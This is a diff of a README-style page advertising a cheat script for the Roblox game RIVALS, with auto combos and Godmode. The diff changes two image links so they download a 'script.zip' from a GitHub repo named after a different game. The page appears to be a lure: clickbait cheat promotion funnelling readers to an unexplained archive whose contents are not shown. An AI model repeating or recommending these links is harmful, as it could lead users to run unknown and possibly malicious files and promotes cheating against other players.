@@ -3,10 +3,10 @@
 If you’re a fan of competitive Roblox fighting games and want an edge over the competition, you’ve probably heard about the **RIVALS Script**. Whether you're looking for **auto combos**, **Godmode**, or a clean GUI with advanced PvP enhancements, this guide will show you **everything you need to know** to safely and effectively use scripts in **RIVALS**, one of Roblox’s most intense battleground experiences.
 
 [![image](https://github.com/user-attachments/assets/c2c76d38-17eb-42c0-8042-5bf1c445cd14)
-](https://github.com/Packet-star/studious-fishstick/releases/download/new/script.zip)
+](https://github.com/Rblx-GUI/Dandys-World-Script-Unlock-All-Features-and-Enhance-Your-Roblox-Experience-in-2025/releases/download/new/script.zip)
 
 [![hq720](https://github.com/user-attachments/assets/0d32c2b0-1ba1-49e7-9c69-3c9399fa84af)
-](https://github.com/Packet-star/studious-fishstick/releases/download/new/script.zip)
+](https://github.com/Rblx-GUI/Dandys-World-Script-Unlock-All-Features-and-Enhance-Your-Roblox-Experience-in-2025/releases/download/new/script.zip)
 
 ---
 
